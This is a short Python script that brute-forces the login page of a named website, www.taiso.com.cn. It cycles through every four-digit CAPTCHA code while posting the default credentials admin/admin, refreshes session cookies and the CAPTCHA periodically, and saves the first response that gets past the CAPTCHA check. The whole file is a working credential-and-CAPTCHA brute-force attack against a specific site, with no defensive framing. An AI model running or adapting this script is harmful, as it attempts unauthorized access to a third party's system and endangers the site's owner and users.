import subprocess, time
URL = 'http://www.taiso.com.cn'
C = '/tmp/taso_c.txt'
for i in range(10000):
    c = f"{i:04d}"
    try:
        if i % 20 == 0:
            subprocess.run(['curl','-sk','--connect-timeout','8','-c',C,'-b',C,'-o','/dev/null',URL+'/login.php'],timeout=10)
            subprocess.run(['curl','-sk','--connect-timeout','8',URL+'/data/include/imagecode.php?act=verifycode','-b',C,'-o','/dev/null'],timeout=10)
        r = subprocess.run(['curl','-sk','-L','--connect-timeout','6','--max-time','8',URL+'/login.php','-X','POST','-d',f'act=login&username=admin&password=admin&valicode={c}&login_btn=login','-b',C],capture_output=True,text=True,timeout=10)
        if '验证码' not in r.stdout and len(r.stdout) > 80:
            with open('/tmp/TASO_HIT.txt','w') as f: f.write(f'code={c}: {r.stdout[:500]}')
            break
    except: pass
    if i % 500 == 0: print(f'[{i}/10000]')
print('DONE')
